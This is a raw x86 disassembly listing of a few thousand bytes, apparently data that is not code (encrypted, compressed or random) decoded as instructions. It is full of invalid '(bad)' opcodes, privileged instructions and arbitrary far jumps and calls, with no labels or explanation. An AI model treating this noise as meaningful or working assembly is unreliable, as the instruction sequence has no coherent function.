  43ac22:	call   0xfc54:0xaa9a68e1
  43ac29:	xor    eax,0xc7451505
  43ac2e:	and    BYTE PTR [ebx+0x472e6c1a],dh
  43ac34:	nop
  43ac35:	sbb    dh,BYTE PTR [esi+0x421d6869]
  43ac3b:	ja     0x43ac6b
  43ac3d:	shr    DWORD PTR [esi+edi*8],cl
  43ac40:	not    BYTE PTR [edx]
  43ac42:	and    ah,dl
  43ac44:	xchg   ebx,eax
  43ac45:	or     DWORD PTR ds:0xc4723b6e,0xd1f0f678
  43ac4f:	js     0x43ac59
  43ac51:	xor    ch,BYTE PTR [ebp+0x3c]
  43ac54:	mov    esp,0x8d91dc77
  43ac59:	iret   
  43ac5a:	push   es
  43ac5b:	ins    BYTE PTR es:[edi],dx
  43ac5c:	popa   
  43ac5d:	call   0xb4806a
  43ac62:	jmp    0x42aa:0xb766d00e
  43ac69:	pusha  
  43ac6a:	sbb    al,0xd9
  43ac6c:	pop    eax
  43ac6d:	push   esi
  43ac6e:	test   al,0x4
  43ac70:	repnz xor DWORD PTR [ecx],esi
  43ac73:	mov    edx,0x72eed194
  43ac78:	(bad)  
  43ac79:	imul   eax,DWORD PTR [edx],0x5458d11e
  43ac7f:	cs and esi,0x1ad8a8d5
  43ac86:	dec    edx
  43ac87:	sahf   
  43ac88:	mov    eax,ds:0x8c4e90cf
  43ac8d:	pop    ecx
  43ac8e:	scas   al,BYTE PTR es:[edi]
  43ac8f:	mov    ds:0x24e68d34,al
  43ac94:	call   0x4c165933
  43ac99:	dec    ebx
  43ac9a:	test   al,0xfc
  43ac9c:	aam    0xe6
  43ac9e:	pusha  
  43ac9f:	push   ecx
  43aca0:	dec    ebp
  43aca1:	xor    al,0xea
  43aca3:	or     DWORD PTR [eax],edi
  43aca5:	xchg   ecx,eax
  43aca6:	xor    cl,bl
  43aca8:	pusha  
  43aca9:	test   al,0xf9
  43acab:	jbe    0x43ace1
  43acad:	xchg   ebp,eax
  43acae:	mov    eax,0xe000327d
  43acb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43acb4:	or     BYTE PTR [esi+ebx*2+0x64c4fa18],ah
  43acbb:	das    
  43acbc:	sbb    BYTE PTR [edx-0x48af95d6],bh
  43acc2:	xchg   DWORD PTR [esi-0xf],ebp
  43acc5:	ds jo  0x43acea
  43acc8:	add    BYTE PTR [edx-0x6c3dfda2],bl
  43acce:	lods   al,BYTE PTR ds:[esi]
  43accf:	cmp    al,0x2c
  43acd1:	lock sbb bh,BYTE PTR [eax+0x41]
  43acd5:	mov    ds:0xf37e50ea,al
  43acda:	(bad)  
  43acdb:	jo     0x43aca8
  43acdd:	jbe    0x43ad5b
  43acdf:	out    dx,al
  43ace0:	xor    ah,ah
  43ace2:	jg     0x43ad61
  43ace4:	push   0x0
  43ace6:	js     0x43ad48
  43ace8:	test   al,0x5b
  43acea:	or     al,0xdc
  43acec:	(bad)  
  43aced:	sub    BYTE PTR [edi],bl
  43acef:	sbb    al,dh
  43acf1:	arpl   WORD PTR [eax],cx
  43acf3:	cmp    al,0xd2
  43acf5:	push   ss
  43acf6:	jmp    0x43ad2d
  43acf8:	mov    eax,ds:0xe83f88ed
  43acfd:	inc    esi
  43acfe:	mov    DWORD PTR [eax],ebp
  43ad00:	jmp    0x282b:0xd440f43f
  43ad07:	ror    BYTE PTR [edx+0x199fface],1
  43ad0d:	sub    esp,ecx
  43ad0f:	and    eax,0xd6bf01e4
  43ad14:	xor    eax,0xa144488
  43ad19:	cwde   
  43ad1a:	in     al,dx
  43ad1b:	into   
  43ad1c:	ss inc ecx
  43ad1e:	jl     0x43ad30
  43ad20:	push   ss
  43ad21:	cwde   
  43ad22:	aam    0x55
  43ad24:	mov    edx,0x7c565049
  43ad29:	add    DWORD PTR [edi],ecx
  43ad2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ad2c:	pop    esi
  43ad2d:	pop    edi
  43ad2e:	inc    eax
  43ad2f:	mov    esi,edx
  43ad31:	in     al,dx
  43ad32:	sbb    DWORD PTR [esi+0x76c94440],esi
  43ad38:	call   0x94eccf6d
  43ad3d:	push   cs
  43ad3e:	add    eax,0x5ed8b22c
  43ad43:	jp     0x43adb5
  43ad45:	pop    edx
  43ad46:	test   al,0x5c
  43ad48:	cmp    eax,0x4ab0dd43
  43ad4d:	aam    0x3c
  43ad4f:	retf   0xb053
  43ad52:	inc    edx
  43ad53:	dec    esp
  43ad54:	sub    al,0x7c
  43ad56:	sahf   
  43ad57:	jnp    0x43adb3
  43ad59:	sub    BYTE PTR [ecx+0x60],al
  43ad5c:	mov    al,ds:0x67a59a43
  43ad61:	int3   
  43ad62:	jbe    0x43ad85
  43ad64:	push   0x73
  43ad66:	data16 cmp dh,al
  43ad69:	cmp    al,0x6
  43ad6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ad6c:	mov    dl,0x2e
  43ad6e:	jmp    0xada6:0x490dc08a
  43ad75:	mov    fs,WORD PTR [eax+ebp*2+0x3f]
  43ad79:	mov    ah,al
  43ad7b:	dec    eax
  43ad7c:	sbb    al,0x8d
  43ad7e:	sbb    al,0xc9
  43ad80:	bound  esp,QWORD PTR [eax]
  43ad82:	mov    al,0xe1
  43ad84:	add    al,0x9c
  43ad86:	ror    BYTE PTR [ecx-0x18],0xb0
  43ad8a:	shl    eax,1
  43ad8c:	std    
  43ad8d:	nop
  43ad8e:	inc    ebx
  43ad8f:	mov    dh,0x50
  43ad91:	sub    eax,0xd2dc20e0
  43ad96:	xchg   ecx,eax
  43ad97:	adc    DWORD PTR [esi+0x5962fd6c],ecx
  43ad9d:	jnp    0x43ada9
  43ad9f:	imul   DWORD PTR [esi+0xa50ed8]
  43ada5:	out    dx,al
  43ada6:	and    al,0xec
  43ada8:	pop    eax
  43ada9:	xchg   esp,eax
  43adaa:	(bad)  
  43adab:	aaa    
  43adac:	push   eax
  43adad:	inc    eax
  43adae:	or     al,0xfb
  43adb0:	(bad)  
  43adb1:	jo     0x43ae00
  43adb3:	add    BYTE PTR [ebx+0x730e028c],bh
  43adb9:	adc    edx,DWORD PTR [ebp+0x2a7b0ea1]
  43adbf:	loopne 0x43ae20
  43adc1:	adc    BYTE PTR [esi],al
  43adc3:	(bad)  
  43adc4:	cdq    
  43adc5:	call   0x4a94:0xf2b45302
  43adcc:	hlt    
  43adcd:	imul   BYTE PTR [ecx+0x79]
  43add0:	(bad)  [esp+edx*4]
  43add3:	aad    0xc4
  43add5:	mov    cl,0xb6
  43add7:	xor    al,0xa8
  43add9:	sbb    ecx,edx
  43addb:	xor    eax,0xa2468701
  43ade0:	lock fs push es
  43ade3:	mov    ah,0xbe
  43ade5:	inc    eax
  43ade6:	in     eax,dx
  43ade7:	push   eax
  43ade8:	ins    BYTE PTR es:[edi],dx
  43ade9:	mov    ds:0x1f866242,al
  43adee:	shr    BYTE PTR [edi+0x3],0x2b
  43adf2:	(bad)
  43adf6:	ss repz sub eax,0xd44b1da3
  43adfd:	mov    ah,0x70
  43adff:	add    edx,esp
  43ae01:	xchg   edi,eax
  43ae02:	adc    BYTE PTR [esi-0x76],0x2b
  43ae06:	(bad)  
  43ae07:	sub    dh,ah
  43ae09:	or     edi,edx
  43ae0b:	sub    DWORD PTR [ecx-0x6],0x1f86c0c
  43ae12:	xor    al,0xc4
  43ae14:	test   al,0x25
  43ae16:	mov    WORD PTR [ebx],gs
  43ae18:	imul   edx,DWORD PTR [ebx],0x37
  43ae1b:	jbe    0x43ae0d
  43ae1d:	push   esi
  43ae1e:	mov    eax,ds:0xd85288f6
  43ae23:	(bad)  
  43ae24:	or     ebp,ecx
  43ae26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ae27:	das    
  43ae28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ae29:	dec    edi
  43ae2a:	add    ebp,DWORD PTR [edi]
  43ae2c:	lock push ss
  43ae2e:	bound  esp,QWORD PTR [ebx+esi*1-0x2f]
  43ae32:	and    eax,0x761ccda9
  43ae37:	imul   ebx,DWORD PTR [ebx],0x7e
  43ae3a:	xchg   BYTE PTR cs:[ebp+edx*1+0x2f977ccd],dh
  43ae42:	add    al,bl
  43ae44:	shl    edx,0xe2
  43ae47:	pop    esi
  43ae48:	loopne 0x43ae8f
  43ae4a:	jl     0x43aeaa
  43ae4c:	mov    DWORD PTR [edx+0x42],eax
  43ae4f:	and    ebx,DWORD PTR [esi]
  43ae51:	mov    ch,bl
  43ae53:	or     BYTE PTR ds:0xfc269815,dh
  43ae59:	(bad)  
  43ae5a:	fs out dx,eax
  43ae5c:	sub    BYTE PTR [edx-0x54],ah
  43ae5f:	dec    ebp
  43ae60:	ret    0xfe64
  43ae63:	rcl    DWORD PTR [edx],cl
  43ae65:	add    eax,0x9a50dfcd
  43ae6a:	sbb    al,0x62
  43ae6c:	inc    ebp
  43ae6d:	retf   0x6900
  43ae70:	jp     0x43ae72
  43ae72:	push   edx
  43ae73:	jle    0x43ae75
  43ae75:	pop    esi
  43ae76:	xor    al,0xd5
  43ae78:	push   ss
  43ae79:	cwde   
  43ae7a:	jp     0x43aee8
  43ae7c:	shr    BYTE PTR [edi+0x68983452],1
  43ae82:	mov    ebx,0xcea67631
  43ae87:	ret    0x7c58
  43ae8a:	push   0x4a
  43ae8c:	lods   eax,DWORD PTR ds:[esi]
  43ae8d:	loope  0x43ae3d
  43ae8f:	xchg   esi,eax
  43ae90:	bnd ret 0x1110
  43ae94:	sbb    BYTE PTR [edi-0x5e],ch
  43ae97:	push   cs
  43ae98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ae99:	sbb    al,0x7e
  43ae9b:	mov    WORD PTR [esi-0x9],?
  43ae9e:	add    dh,dl
  43aea0:	jne    0x43ae69
  43aea2:	xchg   BYTE PTR [edi],al
  43aea4:	add    dl,BYTE PTR [eax+eax*8+0x5c]
  43aea8:	mov    ecx,0xd8a2a96
  43aead:	xchg   edi,eax
  43aeae:	push   edx
  43aeaf:	pop    es
  43aeb0:	(bad)
  43aeb4:	adc    DWORD PTR [edx+0x6d241e2c],esi
  43aeba:	jbe    0x43af2f
  43aebc:	push   0x80ee72b0
  43aec1:	sub    ch,BYTE PTR [esi*1-0x4c73443e]
  43aec8:	ins    BYTE PTR es:[edi],dx
  43aec9:	lea    eax,[eax+0x1df844de]
  43aecf:	inc    eax
  43aed0:	mov    esi,esi
  43aed2:	push   eax
  43aed3:	mov    BYTE PTR [esi],ch
  43aed5:	or     al,0x4c
  43aed7:	dec    esi
  43aed8:	or     BYTE PTR es:[ecx+ebx*2],dl
  43aedc:	mov    ch,0xa0
  43aede:	xchg   esp,eax
  43aedf:	jp     0x43ae71
  43aee1:	bound  ebp,QWORD PTR cs:[esi-0x73]
  43aee5:	pop    edi
  43aee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43aee7:	ss push cs
  43aee9:	sbb    bl,BYTE PTR [ebp+0xa825eda]
  43aeef:	pop    esp
  43aef0:	aam    0xb3
  43aef2:	stos   BYTE PTR es:[edi],al
  43aef3:	jns    0x43af5f
  43aef5:	jle    0x43aea9
  43aef7:	or     BYTE PTR [ebx],0xb
  43aefa:	or     esp,DWORD PTR [ecx+eax*8]
  43aefd:	inc    ecx
  43aefe:	lock repnz lock sbb edx,DWORD PTR [edx-0x59]
  43af04:	mov    dl,BYTE PTR [ebp-0x7e]
  43af07:	push   cs
  43af08:	ins    WORD PTR es:[edi],dx
  43af0a:	jp     0x43aebc
  43af0c:	push   esp
  43af0d:	test   dh,0xa2
  43af10:	js     0x43aebe
  43af12:	xor    DWORD PTR [eax],esi
  43af14:	or     ecx,DWORD PTR [edx]
  43af16:	push   cs
  43af17:	add    dh,cl
  43af19:	(bad)  
  43af1a:	data16 hlt 
  43af1c:	or     al,0x74
  43af1e:	dec    eax
  43af1f:	inc    ecx
  43af20:	lods   eax,DWORD PTR ds:[esi]
  43af21:	jge    0x43af35
  43af23:	(bad)  
  43af24:	adc    al,0x1c
  43af26:	cwde   
  43af27:	jl     0x43af5c
  43af29:	sbb    eax,0xe0428e15
  43af2e:	in     eax,0xf6
  43af30:	mov    cs,WORD PTR [eax-0x767392e]
  43af36:	or     DWORD PTR ds:0xc49cd8da,0x89a708ad
  43af40:	mov    dh,0x1d
  43af42:	jo     0x43af84
  43af44:	(bad)  
  43af45:	out    dx,eax
  43af46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43af47:	add    al,0x6
  43af49:	push   esi
  43af4a:	add    DWORD PTR [ebx+0x53],esp
  43af4d:	ret    
  43af4e:	mov    edx,DWORD PTR [eax-0x2e]
  43af51:	mov    dl,0xcc
  43af53:	arpl   WORD PTR ds:0xdefadf15,cx
  43af59:	inc    edx
  43af5a:	das    
  43af5b:	nop
  43af5c:	fwait
  43af5d:	mov    dl,0x52
  43af5f:	mov    esp,0x428da7d4
  43af64:	or     eax,esp
  43af66:	les    edi,FWORD PTR [esp+eax*1-0x30]
  43af6a:	popa   
  43af6b:	in     eax,dx
  43af6c:	or     BYTE PTR [ebp-0x5a],0x5e
  43af70:	push   0xfffffffc
  43af72:	mov    ebx,0xaa505db1
  43af77:	into   
  43af78:	(bad)  
  43af79:	push   ds
  43af7a:	mov    WORD PTR [edx-0x57974cbb],ds
  43af80:	clc    
  43af81:	xchg   BYTE PTR [edx-0x46],dh
  43af84:	fs cli 
  43af86:	bound  esp,QWORD PTR [eax-0x52]
  43af89:	dec    esp
  43af8a:	ins    DWORD PTR es:[edi],dx
  43af8b:	sub    BYTE PTR [esi-0x62],cl
  43af8e:	sahf   
  43af8f:	fisubr WORD PTR [ecx-0x53e6a8e8]
  43af95:	data16 es clc 
  43af98:	cli    
  43af99:	jge    0x43af5b
  43af9b:	add    DWORD PTR [eax+0x7c485455],esp
  43afa1:	call   0xae1be9f0
  43afa6:	scas   al,BYTE PTR es:[edi]
  43afa7:	sub    ebp,ebp
  43afa9:	aaa    
  43afaa:	rcl    DWORD PTR [ecx-0x48c3e346],cl
  43afb0:	mov    BYTE PTR [edi],ah
  43afb2:	mov    ah,0x46
  43afb4:	mov    ds,esp
  43afb6:	adc    al,0x30
  43afb8:	jl     0x43af42
  43afba:	test   al,0x46
  43afbc:	xchg   BYTE PTR [ebx+edi*2],ch
  43afbf:	pushf  
  43afc0:	shr    BYTE PTR [edx-0x1da9e5c3],0x9
  43afc7:	adc    al,0x38
  43afc9:	sbb    al,0x7f
  43afcb:	rcl    DWORD PTR [edi-0x22],cl
  43afce:	lods   eax,DWORD PTR ds:[esi]
  43afcf:	adc    eax,0x22b868da
  43afd4:	jl     0x43b041
  43afd6:	hlt    
  43afd7:	and    DWORD PTR [esi],edx
  43afd9:	add    DWORD PTR [eax],0xe6881f
  43afdf:	sub    dh,al
  43afe1:	clc    
  43afe2:	into   
  43afe3:	xor    ch,ch
  43afe5:	or     cl,BYTE PTR [ecx-0x4c]
  43afe8:	pop    es
  43afe9:	je     0x43b035
  43afeb:	push   edx
  43afec:	sbb    al,0x2a
  43afee:	loopne 0x43b02e
  43aff0:	inc    esp
  43aff1:	pop    esp
  43aff2:	cmp    BYTE PTR [edx+0x1c],bl
  43aff5:	and    DWORD PTR [esi+ecx*4],0x48
  43aff9:	cmp    DWORD PTR [ecx+0x53a95eda],edx
  43afff:	out    0xb0,eax
  43b001:	pop    es
  43b002:	cmp    BYTE PTR [edx],0xbe
  43b005:	adc    al,0x3c
  43b008:	sbb    edx,edi
  43b00a:	jo     0x43b018
  43b00c:	push   esp
  43b00d:	dec    ecx
  43b00e:	and    ah,BYTE PTR [eax+0x492166c8]
  43b014:	mov    ch,0x60
  43b016:	mov    bl,BYTE PTR [esi]
  43b018:	or     dl,ah
  43b01a:	add    BYTE PTR [eax+0x16544d80],dl
  43b020:	xor    ebx,edx
  43b022:	fadd   st(4),st
  43b024:	or     eax,0x7c092e84
  43b029:	xor    al,0x25
  43b02b:	sahf   
  43b02c:	nop
  43b02d:	retf   
  43b02e:	pop    ecx
  43b02f:	jp     0x43b089
  43b031:	pop    ebp
  43b032:	out    0x0,al
  43b034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b035:	fst    DWORD PTR [eax+0x41]
  43b038:	lods   eax,DWORD PTR ds:[esi]
  43b039:	fiadd  DWORD PTR [edi+0x16]
  43b03c:	mov    edi,0xda483e28
  43b041:	stos   DWORD PTR es:[edi],eax
  43b042:	lods   al,BYTE PTR ds:[esi]
  43b043:	adc    eax,0x20b28c15
  43b048:	lea    ebp,[ecx-0x6d]
  43b04b:	test   al,0x9f
  43b04d:	xor    BYTE PTR [eax-0xf159bb6],0x80
  43b054:	(bad)  
  43b055:	aad    0xb0
  43b057:	pusha  
  43b058:	xlat   BYTE PTR ds:[ebx]
  43b059:	add    bl,BYTE PTR [edx]
  43b05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b05c:	xchg   edi,eax
  43b05d:	add    BYTE PTR [edx+eiz*4+0x70],bh
  43b061:	xor    al,0x3b
  43b063:	fisubr DWORD PTR [edx+0x7ee309f6]
  43b069:	jbe    0x43b081
  43b06b:	or     BYTE PTR [edx-0x1cfeb140],bl
  43b071:	push   ecx
  43b072:	mov    BYTE PTR ds:0x1397f21c,0x8e
  43b079:	dec    esi
  43b07a:	dec    ecx
  43b07b:	xchg   esp,eax
  43b07c:	push   0x24
  43b07e:	cld    
  43b07f:	jo     0x43b085
  43b081:	and    DWORD PTR [esi],0x67f895f8
  43b087:	adc    bl,BYTE PTR [edi+0x7c9aa422]
  43b08d:	xor    dl,BYTE PTR [esi-0x5e]
  43b090:	inc    edi
  43b091:	sub    al,0x40
  43b093:	add    al,0x14
  43b095:	jmp    0x982a:0x6a433d16
  43b09c:	ficomp WORD PTR ss:[edx]
  43b09f:	jp     0x43b063
  43b0a1:	or     BYTE PTR [ebp+0x61],0xc8
  43b0a5:	call   0xcdb456d4
  43b0aa:	pop    es
  43b0ab:	adc    ebp,ebp
  43b0ad:	aaa    
  43b0ae:	mov    ds:0xfbb80ca9,al
  43b0b3:	out    0xa,al
  43b0b5:	sbb    ch,BYTE PTR [ebp+0x58f63fd9]
  43b0bb:	push   edx
  43b0bc:	mov    ds:0x8026147c,al
  43b0c1:	add    bl,BYTE PTR [eax]
  43b0c3:	add    eax,0xe8fc22ba
  43b0c8:	ret    0xea6b
  43b0cb:	adc    esp,edx
  43b0cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b0ce:	mov    al,0xc6
  43b0d0:	xor    ecx,DWORD PTR [eax]
  43b0d2:	and    al,0x1
  43b0d4:	test   al,0xa4
  43b0d7:	xlat   BYTE PTR cs:[ebx]
  43b0d9:	push   ss
  43b0da:	inc    edi
  43b0db:	jnp    0x43b08f
  43b0dd:	push   ebp
  43b0de:	push   0xffffffb3
  43b0e0:	adc    dl,BYTE PTR [ecx+0x70]
  43b0e3:	lods   al,BYTE PTR ds:[esi]
  43b0e4:	nop
  43b0e5:	add    BYTE PTR [esi-0x68],dl
  43b0e8:	or     WORD PTR [esi-0x4739b91e],bp
  43b0ef:	dec    ebx
  43b0f0:	prefetch BYTE PTR [ebp+0x28]
  43b0f4:	in     eax,dx
  43b0f5:	xchg   ebp,eax
  43b0f6:	mul    ch
  43b0f8:	push   0xffffff81
  43b0fa:	or     BYTE PTR [esi],0xe3
  43b0fd:	repnz clc 
  43b0ff:	je     0x43b0a8
  43b101:	and    al,0x8a
  43b103:	ror    DWORD PTR [esi+esi*4],1
  43b106:	sahf   
  43b107:	mov    al,al
  43b109:	retf   0x4c3a
  43b10c:	mov    ch,BYTE PTR [eax]
  43b10e:	cmp    DWORD PTR [edx-0x59bdfd72],edi
  43b114:	repz scas eax,DWORD PTR es:[edi]
  43b116:	or     DWORD PTR [eax+eax*4],edi
  43b119:	and    dh,BYTE PTR [ebp-0x1f57a3f0]
  43b11f:	mov    al,ds:0x3a6891eb
  43b124:	ror    BYTE PTR [edx-0x45795bfd],cl
  43b12a:	dec    esp
  43b12b:	or     BYTE PTR [ecx],cl
  43b12d:	test   ah,cl
  43b12f:	xchg   esi,eax
  43b130:	aam    0x6a
  43b132:	xchg   edi,eax
  43b133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b134:	pushf  
  43b135:	and    eax,0xaa1c34f4
  43b13a:	dec    esp
  43b13b:	or     ch,BYTE PTR es:[ebp+ebp*1-0x74]
  43b140:	mov    dl,BYTE PTR [esi]
  43b142:	mov    bl,0xc
  43b144:	xchg   ecx,eax
  43b145:	sbb    bh,al
  43b147:	mov    al,ds:0xd052dcda
  43b14c:	xchg   BYTE PTR [esi],al
  43b14e:	je     0x43b198
  43b150:	pop    esp
  43b151:	dec    esi
  43b152:	xrelease mov BYTE PTR [ebp+0x1c84e0a1],ch
  43b159:	nop
  43b15a:	push   0x50
  43b15c:	xor    ch,BYTE PTR [esi]
  43b15e:	mov    ds:0xc5416061,eax
  43b163:	xchg   ebx,eax
  43b164:	xor    al,0x51
  43b166:	add    al,0x6e
  43b168:	mov    ah,BYTE PTR [ebp-0x1f]
  43b16b:	add    bl,BYTE PTR [eax+0x70]
  43b16e:	push   0x83badc52
  43b173:	(bad)  
  43b174:	fidiv  DWORD PTR [ecx+0x324a5db4]
  43b17a:	lods   al,BYTE PTR ds:[esi]
  43b17b:	sub    BYTE PTR [ebx],dl
  43b17d:	pop    edx
  43b17e:	lods   al,BYTE PTR ds:[esi]
  43b17f:	lods   al,BYTE PTR ds:[esi]
  43b180:	(bad)  
  43b181:	xor    al,0x50
  43b183:	pusha  
  43b184:	cmp    BYTE PTR [eax+eax*8+0x40531ec2],0x6b
  43b18c:	sub    ah,dl
  43b18e:	call   0xa863:0x43fad6e9
  43b195:	xchg   edi,eax
  43b196:	adc    BYTE PTR [esi+ebx*1-0x44a4f5d9],0xd4
  43b19e:	pop    ax
  43b1a0:	dec    esp
  43b1a1:	mov    edi,0xbb042de6
  43b1a6:	(bad)  
  43b1a7:	into   
  43b1a8:	push   0x60601444
  43b1ad:	cs jle 0x43b1c0
  43b1b0:	mov    bl,0x4f
  43b1b2:	xchg   edx,eax
  43b1b3:	ss int 0x34
  43b1b6:	jbe    0x43b20e
  43b1b8:	nop
  43b1b9:	(bad)  
  43b1ba:	sbb    al,0x71
  43b1bc:	dec    eax
  43b1bd:	call   0xe503b63
  43b1c2:	lock dec esi
  43b1c4:	xchg   ecx,eax
  43b1c5:	and    BYTE PTR [esi+0x764d4076],0xb1
  43b1cc:	cmp    cl,BYTE PTR [ebx+0x3a]
  43b1cf:	call   0x6d86:0xf154074d
  43b1d6:	add    al,0xfd
  43b1d8:	fsub   DWORD PTR [esp+eax*4]
  43b1db:	retf   
  43b1dc:	cli    
  43b1dd:	mov    dl,0xa2
  43b1df:	pop    edx
  43b1e0:	in     al,0xad
  43b1e2:	cmp    eax,0xa3941549
  43b1e7:	mov    al,ds:0xd691161e
  43b1ec:	pop    ecx
  43b1ed:	fwait
  43b1ee:	scas   al,BYTE PTR es:[edi]
  43b1ef:	lods   eax,DWORD PTR ds:[esi]
  43b1f0:	add    eax,0x98e8c854
  43b1f5:	call   0x3c21:0x50d57f1c
  43b1fc:	push   edx
  43b1fd:	jp     0x43b255
  43b1ff:	clc    
  43b200:	lds    ebx,FWORD PTR [eax]
  43b202:	pop    eax
  43b203:	js     0x43b1b7
  43b205:	mov    ds:0xa0a83886,al
  43b20a:	call   0x25e8ee1
  43b20f:	fs jle 0x43b221
  43b212:	xchg   edx,eax
  43b213:	mov    al,0x40
  43b215:	gs mov dh,0x48
  43b218:	ret    0xa0da
  43b21b:	dec    eax
  43b21c:	inc    esi
  43b21d:	sti    
  43b21e:	dec    esi
  43b21f:	inc    edi
  43b220:	cmp    dh,BYTE PTR [edi-0x3c]
  43b223:	cmp    DWORD PTR [ebp+0x0],ebp
  43b226:	mov    edi,0xedd4cc21
  43b22b:	or     eax,0x94fad15d
  43b230:	xchg   esp,eax
  43b231:	stc    
  43b232:	in     al,0xa
  43b234:	inc    edx
  43b235:	mov    cl,ch
  43b237:	push   eax
  43b238:	inc    esp
  43b239:	rdmsr  
  43b23b:	mov    al,ds:0xe9b8d9b6
  43b240:	pop    es
  43b241:	test   al,0x2a
  43b243:	mov    ah,0xb6
  43b245:	mov    dl,BYTE PTR [ebp+0x3e]
  43b248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b249:	mov    eax,ds:0xc87c4fae
  43b24e:	ds pop edi
  43b250:	push   edx
  43b251:	rol    BYTE PTR [edx],1
  43b253:	mov    ch,0x20
  43b255:	bound  ecx,QWORD PTR [esi+eiz*1]
  43b258:	mov    esp,0x5f4d88b5
  43b25d:	int3   
  43b25e:	imul   edx,DWORD PTR [eax],0x66a3afe
  43b264:	ds pop ebx
  43b266:	in     eax,dx
  43b267:	(bad)  
  43b268:	push   ebp
  43b269:	mov    eax,0x9dda3c6c
  43b26e:	mov    ah,0x2e
  43b270:	mov    BYTE PTR [edi+0x28ece79a],al
  43b276:	sub    eax,edi
  43b278:	les    eax,FWORD PTR [esi+0x1d]
  43b27b:	test   al,0xd5
  43b27d:	sub    eax,0xa3cddab
  43b282:	pusha  
  43b283:	shl    BYTE PTR [ecx],0xa4
  43b286:	xchg   ecx,eax
  43b287:	sbb    bh,bh
  43b289:	fdivrp st(1),st
  43b28b:	sbb    dh,dl
  43b28d:	push   esi
  43b28e:	test   al,0xed
  43b290:	mov    fs,WORD PTR [ebx]
  43b292:	out    0x5c,al
  43b294:	fidiv  WORD PTR ds:0x80b00002
  43b29a:	dec    ebp
  43b29b:	jbe    0x43b288
  43b29d:	xor    eax,0xa09a1581
  43b2a2:	or     eax,0xc4d41e32
  43b2a7:	(bad)  
  43b2a8:	jo     0x43b2ef
  43b2aa:	xchg   esi,eax
  43b2ab:	push   ecx
  43b2ac:	outs   dx,BYTE PTR ds:[esi]
  43b2ad:	mov    ah,0xe2
  43b2af:	push   ecx
  43b2b0:	push   eax
  43b2b1:	dec    ebp
  43b2b2:	lods   eax,DWORD PTR ds:[esi]
  43b2b3:	mov    al,ds:0xef18d446
  43b2b8:	call   0x8c12:0xbf427c69
  43b2bf:	clc    
  43b2c0:	out    0x5b,al
  43b2c2:	add    eax,0xe8ba144f
  43b2c7:	lock pop esi
  43b2c9:	jmp    0x423bb746
  43b2ce:	test   eax,0xd6e96a6d
  43b2d3:	push   edx
  43b2d4:	inc    ebx
  43b2d5:	aam    0xb2
  43b2d7:	rol    al,1
  43b2d9:	ins    DWORD PTR es:[edi],dx
  43b2da:	jmp    0x70f8b6ea
  43b2df:	test   DWORD PTR [edx],eax
  43b2e1:	or     ebp,DWORD PTR [ebp+0x1f8eba06]
  43b2e7:	in     al,dx
  43b2e8:	or     dl,BYTE PTR [esi]
  43b2ea:	jle    0x43b306
  43b2ec:	pop    ds
  43b2ed:	mov    dl,dh
  43b2ef:	add    dh,BYTE PTR [esi+eiz*2+0x5d8212cd]
  43b2f6:	push   edi
  43b2f7:	clc    
  43b2f8:	jg     0x43b338
  43b2fa:	lds    edx,FWORD PTR [edi]
  43b2fc:	push   esp
  43b2fd:	aas    
  43b2fe:	adc    DWORD PTR [ebp+0x22],0xae29a2ee
  43b305:	mov    ds:0x25ca6887,al
  43b30a:	sbb    eax,0x388c5c50
  43b30f:	add    BYTE PTR [edi+0x37480a85],bl
  43b315:	pusha  
  43b316:	nop
  43b317:	dec    eax
  43b318:	jge    0x43b33a
  43b31a:	jbe    0x43b359
  43b31c:	xor    al,0x3d
  43b31e:	mov    WORD PTR [esi-0x65b31b6],cs
  43b324:	add    al,BYTE PTR [edi]
  43b326:	mov    BYTE PTR [ecx-0x694d6de4],dl
  43b32c:	(bad)  
  43b32d:	adc    BYTE PTR [esi-0x2573c67a],dh
  43b333:	mov    BYTE PTR [esp+ebx*8-0x56],ah
  43b337:	clc    
  43b338:	push   cs
  43b339:	add    DWORD PTR [ebp+0x5],ebp
  43b33c:	xchg   esi,eax
  43b33d:	sub    eax,0x66eb3d34
  43b342:	cwde   
  43b343:	add    bl,BYTE PTR [esi]
  43b345:	inc    edx
  43b346:	stos   DWORD PTR es:[edi],eax
  43b347:	jle    0x43b2ec
  43b349:	lock stos BYTE PTR es:[edi],al
  43b34b:	push   ds
  43b34c:	mov    cl,0x52
  43b34e:	dec    eax
  43b34f:	in     eax,dx
  43b350:	rol    BYTE PTR [edx+0x32],0x4
  43b354:	ins    BYTE PTR es:[edi],dx
  43b355:	mov    dl,0xf6
  43b357:	pop    ecx
  43b358:	push   0x5d
  43b35a:	sbb    dl,BYTE PTR [eax]
  43b35c:	pop    eax
  43b35d:	push   esp
  43b35e:	loopne 0x43b3a9
  43b360:	jne    0x43b3ae
  43b362:	or     eax,0x96e6d45f
  43b367:	add    al,bh
  43b369:	test   al,0x13
  43b36b:	cli    
  43b36c:	leave  
  43b36d:	add    ch,BYTE PTR [edx+0x156868ac]
  43b373:	(bad)  
  43b374:	fldenv [esi+0x3ac5f871]
  43b37a:	xchg   ecx,eax
  43b37b:	sti    
  43b37c:	ds (bad) 
  43b37f:	or     al,0x34
  43b381:	js     0x43b3ec
  43b383:	add    BYTE PTR [esi+0x40882d97],cl
  43b389:	or     DWORD PTR [edx+esi*8+0x568c33ea],eax
  43b390:	mov    WORD PTR [ecx],?
  43b392:	hlt    
  43b393:	add    eax,0xf6c160da
  43b398:	sbb    DWORD PTR [eax],eax
  43b39a:	pop    esi
  43b39b:	clc    
  43b39c:	mov    esp,0xc00284ee
  43b3a1:	add    al,0x78
  43b3a3:	add    eax,0xfc118e6c
  43b3a8:	mov    gs,WORD PTR [ebx-0x5]
  43b3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
